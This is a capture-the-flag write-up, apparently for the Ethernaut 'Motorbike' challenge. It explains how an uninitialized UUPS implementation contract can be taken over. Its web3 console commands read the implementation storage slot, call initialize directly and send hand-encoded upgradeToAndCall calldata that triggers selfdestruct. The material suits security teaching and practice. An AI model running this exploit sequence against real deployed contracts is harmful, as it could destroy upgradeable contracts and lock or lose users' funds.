# Logic 
UUPS Upgradeable Proxy has the logic for changing the implementation inside the implementation. In this challenge you have to pay attention at what function can be executed and in what context are executed

BTW: this challenge represents an early vulnerability of the OpenZeppelin contract

# Solution 

To change the implementation we need to have the upgradable role, that meaning to have our address has to be in the `upgrade` slot.

We can see that the `initialize` function sets the `upgrader` to `msg.sender`. This function was called for the first time on the proxy constructor, and the changes are made in the context of the proxy. That meaning, the `initializer` modifier will make changes in the state of the proxy, not on the implementation state.  So we can call the `initialize` function one more time, in the context of the implementation.

Let's take the implementation address:

```
await web3.eth.getStorageAt(contract.address,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
```

And now call the `initialize` method
```
await sendTransaction({from: player,to: "<address_of_implementation>", data: "0x8129fc1c"})
```

Deploy a malicious implementation contract, that can call `selfdestruct`. You can find an example at `MotorbikeImplementation.sol`


After these steps, we have control of the implementation contract, so let's upgrade it stealthily:
```
await sendTransaction({from: player, to: "<address_of_original_implementation>", data: "4f1ef286000000000000000000000000d82f99916aca469c1b9e028a45896b190d443412000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000049e5faafc00000000000000000000000000000000000000000000000000000000"})
```

Some explanation of the above method:
 * `to` has to be the implementation because in the proxy contract, the `upgrader` field is still setted correctly with the address from the deploy
 * `data` represents the `upgradeToAndCall` with the new params **abi encoded**:
    * `new contract implementation address`
    * `data` -> the function that calls `selfdestruct`, in our case `attack`